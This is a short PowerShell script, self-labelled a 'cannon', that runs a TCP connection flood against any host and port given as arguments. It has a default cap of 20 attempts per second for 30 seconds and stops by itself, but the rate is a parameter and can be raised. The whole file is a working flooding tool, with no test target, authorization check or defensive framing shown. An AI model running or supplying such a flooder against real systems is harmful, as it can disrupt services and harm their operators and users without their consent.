param(
    [Parameter(Mandatory = $true)]
    [string]$TargetHost,
    [Parameter(Mandatory = $true)]
    [int]$TargetPort,
    [int]$RatePerSecond = 20,
    [int]$DurationSeconds = 30
)
$ErrorActionPreference = 'SilentlyContinue'
$delayMs = [int](1000 / [Math]::Max(1, $RatePerSecond))
$deadline = (Get-Date).AddSeconds($DurationSeconds)
$attempts = 0
$connected = 0
Write-Output "[cannon] Starting rate-capped connection flood against ${TargetHost}:${TargetPort} (rate=$RatePerSecond/s, duration=${DurationSeconds}s)"
while ((Get-Date) -lt $deadline) {
    $attempts++
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $iar = $client.BeginConnect($TargetHost, $TargetPort, $null, $null)
        $ok = $iar.AsyncWaitHandle.WaitOne(500)
        if ($ok -and $client.Connected) {
            $connected++
            $client.EndConnect($iar)
        }
        $client.Close()
    } catch {
    }
    Start-Sleep -Milliseconds $delayMs
}
Write-Output "[cannon] Done: $attempts attempts, $connected connected, stopped after ${DurationSeconds}s (self-terminated, not left running)."
